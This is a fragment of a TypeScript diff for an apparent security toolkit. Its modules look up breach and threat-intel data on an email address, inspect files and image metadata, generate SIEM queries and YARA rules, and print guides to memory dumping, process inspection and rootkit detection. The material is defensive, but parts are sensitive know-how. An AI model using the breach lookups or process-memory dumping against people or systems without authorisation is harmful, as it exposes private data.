+        if (pulses > 0) lines.push(`[OTX EMAIL] ${pulses} threat intel report(s) linked to this address`);
+      }
+      if (domainRes.status === 'fulfilled' && domainRes.value.ok) {
+        const d = await domainRes.value.json() as Record<string, unknown>;
+        const pulses = ((d["pulse_info"] as Record<string, unknown>)?.["count"] as number) ?? 0;
+        const rep = (d["reputation"] as number) ?? 0;
+        lines.push(`[OTX DOMAIN] ${domain} — ${pulses} pulse(s)${rep < 0 ? `  ⚠ reputation: ${rep}` : ''}`);
+      }
+    }
+  } catch { /* skip */ }
+
+  // ── MX check ──────────────────────────────────────────────────────────────
+  if (domain) {
+    const mx = await dns.resolveMx(domain).catch(() => [] as Array<{exchange: string; priority: number}>);
+    lines.push(`[MAIL SERVER] ${mx.length > 0 ? mx.sort((a,b) => a.priority - b.priority)[0]!.exchange : 'no MX records'}`);
+  }
+
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[HIBP MANUAL] https://haveibeenpwned.com/account/${encodeURIComponent(email)}`);
+  lines.push(`[DEHASHED] https://dehashed.com/search?query=${encodeURIComponent(email)}`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+// ── FORENSICS / METADATA MODULES (187-194) ────────────────────────────────────
+
+async function fetchStegDetectLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] STEGANOGRAPHY DETECT — image analysis for hidden data`);
+  lines.push(`[TARGET] ${target}`);
+  let url = target.trim();
+  if (!url.startsWith('http')) url = `https://${url}`;
+  try {
+    const res = await fetch(url, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SentinelBot/1.0)' },
+      signal: AbortSignal.timeout(10000),
+    });
+    const ct = res.headers.get('content-type') ?? '';
+    const cl = res.headers.get('content-length') ?? 'unknown';
+    lines.push(`[CONTENT-TYPE] ${ct}`);
+    lines.push(`[SIZE] ${cl} bytes`);
+    const isImage = ct.startsWith('image/');
+    const format = ct.includes('png') ? 'PNG' : ct.includes('jpeg') || ct.includes('jpg') ? 'JPEG' : ct.includes('gif') ? 'GIF' : ct.includes('bmp') ? 'BMP' : 'other';
+    lines.push(`[FORMAT] ${format}`);
+    lines.push(`──────────────────────────────────────────────`);
+    if (isImage) {
+      lines.push(`[ANALYSIS TECHNIQUES]`);
+      lines.push(`  LSB (Least Significant Bit) — most common`);
+      lines.push(`  DCT coefficient modification — used in JPEG`);
+      lines.push(`  Appended data after EOF marker`);
+      lines.push(`  Metadata embedding (EXIF comments)`);
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[TOOLS]`);
+  lines.push(`  steghide extract -sf image.jpg`);
+  lines.push(`  zsteg image.png          (Ruby gem)`);
+  lines.push(`  binwalk -e image.png     (embedded files)`);
+  lines.push(`  strings image.png | grep -i flag`);
+  lines.push(`  exiftool image.jpg       (metadata)`);
+  lines.push(`[ONLINE] https://www.aperisolve.com/`);
+  lines.push(`[DONE] Analysis complete.`);
+  return lines;
+}
+
+async function fetchFileMetadataLines(moduleId: number, target: string, label: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] ${label} — file metadata extraction`);
+  lines.push(`[TARGET] ${target}`);
+  let url = target.trim();
+  if (!url.startsWith('http')) url = `https://${url}`;
+  try {
+    const res = await fetch(url, {
+      method: 'HEAD',
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SentinelBot/1.0)' },
+      signal: AbortSignal.timeout(8000),
+      redirect: 'follow',
+    });
+    const h = Object.fromEntries(res.headers.entries());
+    lines.push(`[STATUS] HTTP ${res.status}`);
+    lines.push(`[CONTENT-TYPE] ${h['content-type'] ?? 'unknown'}`);
+    lines.push(`[SIZE] ${h['content-length'] ? `${parseInt(h['content-length']!).toLocaleString()} bytes` : 'unknown'}`);
+    lines.push(`[LAST-MODIFIED] ${h['last-modified'] ?? 'not disclosed'}`);
+    lines.push(`[SERVER] ${h['server'] ?? 'not disclosed'}`);
+    lines.push(`[ETAG] ${h['etag'] ?? 'none'}`);
+    const ext = url.split('.').pop()?.toLowerCase() ?? '';
+    lines.push(`──────────────────────────────────────────────`);
+    if (['jpg','jpeg','png','heic','tiff'].includes(ext)) {
+      lines.push(`[IMAGE RISKS] GPS coordinates | Camera model | Serial | Date | Software`);
+    } else if (ext === 'pdf') {
+      lines.push(`[PDF RISKS] Author | Creation date | Software | Tracked changes`);
+    } else if (['docx','xlsx','pptx','doc','xls','ppt'].includes(ext)) {
+      lines.push(`[OFFICE RISKS] Author | Company | Last saved by | Revision number | Comments`);
+    } else if (['mp3','flac','ogg','m4a'].includes(ext)) {
+      lines.push(`[AUDIO RISKS] ID3 tags | Recording software | Date | GPS (some formats)`);
+    } else if (['mp4','mov','avi','mkv'].includes(ext)) {
+      lines.push(`[VIDEO RISKS] Encoding software | Date | GPS | Device info`);
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[CMD] exiftool ${url}`);
+  lines.push(`[ONLINE] https://www.metadata2go.com/`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchFileTimelineLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] FILE TIMELINE — temporal metadata reconstruction`);
+  lines.push(`[TARGET] ${target}`);
+  let url = target.trim();
+  if (!url.startsWith('http')) url = `https://${url}`;
+  try {
+    const res = await fetch(url, {
+      method: 'HEAD',
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SentinelBot/1.0)' },
+      signal: AbortSignal.timeout(8000),
+    });
+    const lastMod = res.headers.get('last-modified');
+    const date = res.headers.get('date');
+    lines.push(`[HTTP DATE] ${date ?? 'not provided'}`);
+    lines.push(`[LAST-MODIFIED] ${lastMod ?? 'not provided'}`);
+    if (lastMod) {
+      const d = new Date(lastMod);
+      lines.push(`[EPOCH] ${Math.floor(d.getTime() / 1000)}`);
+      lines.push(`[DAY OF WEEK] ${d.toLocaleDateString('en-US', { weekday: 'long' })}`);
+      const hour = d.getUTCHours();
+      lines.push(`[UTC HOUR] ${hour}:00 — ${(hour >= 9 && hour <= 17) ? 'business hours' : 'outside business hours'}`);
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[WAYBACK] https://web.archive.org/web/*/${url}`);
+  lines.push(`[DEEP META] exiftool -time:all -a -u -G1 file`);
+  lines.push(`[DISK FORENSICS] sleuthkit/autopsy for atime/mtime/ctime`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+// ── SIEM / SOC MODULES (196-200) ─────────────────────────────────────────────
+
+async function fetchSiemQueryLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] SIEM QUERY — threat hunting query generator`);
+  lines.push(`[IOC/TERM] ${target}`);
+  const t = target.trim();
+  const isIp = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(t);
+  const isDomain = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}\.[a-zA-Z]{2,}$/.test(t);
+  const isHash = /^[0-9a-fA-F]{32,64}$/.test(t);
+  lines.push(`──── SPLUNK ────────────────────────────────`);
+  if (isIp) {
+    lines.push(`  index=* (src_ip="${t}" OR dest_ip="${t}" OR url="*${t}*")`);
+    lines.push(`  | stats count by sourcetype, host, user | sort -count`);
+  } else if (isDomain) {
+    lines.push(`  index=* (query="${t}" OR url="*${t}*" OR domain="${t}")`);
+    lines.push(`  | timechart count by sourcetype`);
+  } else if (isHash) {
+    lines.push(`  index=* (hash="${t}" OR md5="${t}" OR sha256="${t}")`);
+    lines.push(`  | table _time, host, user, process, file_path`);
+  } else {
+    lines.push(`  index=* "${t}" | stats count by host, sourcetype | sort -count`);
+  }
+  lines.push(`──── ELASTIC KQL ────────────────────────────`);
+  if (isIp) lines.push(`  source.ip:"${t}" OR destination.ip:"${t}"`);
+  else if (isDomain) lines.push(`  dns.question.name:"${t}" OR url.domain:"${t}"`);
+  else if (isHash) lines.push(`  process.hash.md5:"${t}" OR file.hash.sha256:"${t}"`);
+  else lines.push(`  message:"${t}" OR process.name:"${t}"`);
+  lines.push(`──── QRADAR AQL ─────────────────────────────`);
+  if (isIp) lines.push(`  SELECT * FROM events WHERE sourceip='${t}' OR destinationip='${t}' LAST 24 HOURS`);
+  else lines.push(`  SELECT * FROM events WHERE UTF8(payload) ILIKE '%${t}%' LAST 24 HOURS`);
+  lines.push(`──── SIGMA RULE ─────────────────────────────`);
+  lines.push(`  title: Detection of ${t}`);
+  lines.push(`  detection:`);
+  lines.push(`    keywords: ['${t}']`);
+  lines.push(`    condition: keywords`);
+  lines.push(`[DONE] Queries generated.`);
+  return lines;
+}
+
+async function fetchYaraRuleLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] YARA RULE — malware detection rule generator`);
+  lines.push(`[PATTERN] ${target}`);
+  const t = target.trim();
+  const ruleName = `Sentinel_${Date.now().toString(36).toUpperCase()}`;
+  const hexStr = Buffer.from(t).toString('hex').match(/.{2}/g)?.join(' ') ?? '';
+  const b64Str = Buffer.from(t).toString('base64');
+  lines.push(`──── GENERATED YARA RULE ────────────────────`);
+  lines.push(`rule ${ruleName}`);
+  lines.push(`{`);
+  lines.push(`    meta:`);
+  lines.push(`        description = "Sentinel detection: ${t.slice(0, 50)}"`);
+  lines.push(`        date = "${new Date().toISOString().slice(0, 10)}"`);
+  lines.push(`        severity = "MEDIUM"`);
+  lines.push(``);
+  lines.push(`    strings:`);
+  lines.push(`        $str1 = "${t.replace(/"/g, '\\"')}" ascii wide`);
+  lines.push(`        $b64  = "${b64Str}" ascii`);
+  lines.push(`        $hex  = { ${hexStr} }`);
+  lines.push(``);
+  lines.push(`    condition:`);
+  lines.push(`        any of them`);
+  lines.push(`}`);
+  lines.push(`──── SCAN COMMANDS ──────────────────────────`);
+  lines.push(`  yara -r rule.yar /path/to/scan`);
+  lines.push(`  yara -s -m rule.yar sample.bin`);
+  lines.push(`  retrohunt: vt retrohunt submit rule.yar`);
+  lines.push(`[DOCS] https://yara.readthedocs.io/`);
+  lines.push(`[DONE] Rule generated.`);
+  return lines;
+}
+
+async function fetchMemoryDumpLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] MEMORY DUMP ANALYSIS — Windows/Linux memory forensics`);
+  lines.push(`[TARGET/PROCESS] ${target}`);
+  lines.push(`──── ACQUISITION ────────────────────────────`);
+  lines.push(`  Windows: procdump.exe -ma ${target} dump.dmp`);
+  lines.push(`  Windows: winpmem_mini.exe memory.raw`);
+  lines.push(`  Linux:   gcore $(pgrep ${target})`);
+  lines.push(`  Linux:   /proc/$(pgrep ${target})/mem`);
+  lines.push(`──── VOLATILITY 3 ───────────────────────────`);
+  lines.push(`  vol -f memory.raw windows.pslist     # process list`);
+  lines.push(`  vol -f memory.raw windows.cmdline    # command line args`);
+  lines.push(`  vol -f memory.raw windows.netscan    # network connections`);
+  lines.push(`  vol -f memory.raw windows.malfind    # injected code`);
+  lines.push(`  vol -f memory.raw windows.dlllist    # loaded DLLs`);
+  lines.push(`──── IOC EXTRACTION ─────────────────────────`);
+  lines.push(`  strings memory.raw | grep -iE '(http|ftp|C2)' | sort -u`);
+  lines.push(`  bulk_extractor memory.raw -o output/`);
+  lines.push(`[DONE] Guide complete.`);
+  return lines;
+}
+
+async function fetchProcInspectLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] PROCESS INSPECT — process forensics + anomaly detection`);
+  lines.push(`[PROCESS] ${target}`);
+  lines.push(`──── WINDOWS ────────────────────────────────`);
+  lines.push(`  Get-Process ${target} | Select-Object *`);
+  lines.push(`  wmic process where name="${target}.exe" get CommandLine,ParentProcessID`);
+  lines.push(`  Get-WmiObject Win32_Process -Filter "Name='${target}.exe'" | Select ParentProcessId,CommandLine`);
+  lines.push(`──── LINUX ──────────────────────────────────`);
+  lines.push(`  ps aux | grep ${target}`);
+  lines.push(`  cat /proc/$(pgrep ${target})/cmdline | tr '\\0' ' '`);
+  lines.push(`  ls -la /proc/$(pgrep ${target})/exe`);
+  lines.push(`  lsof -p $(pgrep ${target})`);
+  lines.push(`  ss -tunp | grep $(pgrep ${target})`);
+  lines.push(`──── SUSPICIOUS INDICATORS ──────────────────`);
+  lines.push(`  Unusual child of cmd.exe/powershell`);
+  lines.push(`  RWX memory sections → injected shellcode`);
+  lines.push(`  Unusual outbound ports from system processes`);
+  lines.push(`  PE header missing in memory (unpacked malware)`);
+  lines.push(`[TOOLS] Process Hacker, PE-sieve, Hollows Hunter`);
+  lines.push(`[DONE] Guide complete.`);
+  return lines;
+}
+
+async function fetchRootkitCheckLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] ROOTKIT CHECK — detection methodology + tools`);
+  lines.push(`[SYSTEM/TARGET] ${target}`);
+  lines.push(`──── LINUX DETECTION ────────────────────────`);
+  lines.push(`  rkhunter --check --sk`);
+  lines.push(`  chkrootkit`);
+  lines.push(`  lynis audit system`);
+  lines.push(`  unhide proc sys       # hidden processes`);
+  lines.push(`  unhide-tcp            # hidden ports`);
+  lines.push(`──── WINDOWS DETECTION ──────────────────────`);
+  lines.push(`  Autoruns.exe (Sysinternals) — all persistence points`);
+  lines.push(`  GMER — kernel-mode rootkit scanner`);
+  lines.push(`  Malwarebytes Anti-Rootkit`);
+  lines.push(`──── INDICATORS ─────────────────────────────`);
+  lines.push(`  Processes in /proc not visible via ps`);
+  lines.push(`  SSDT/IDT hooks in Windows kernel`);
+  lines.push(`  DKOM — EPROCESS unlinked from list`);
+  lines.push(`  Bootkit: MBR/VBR modification`);
+  lines.push(`  Discrepancy between API + raw disk reads`);
+  lines.push(`──── PREVENTION ─────────────────────────────`);
+  lines.push(`  Secure Boot | UEFI + TPM | Kernel lockdown (Linux)`);
+  lines.push(`  Integrity monitoring: aide, tripwire`);
+  lines.push(`[DONE] Guide complete.`);
   return lines;
 }
 
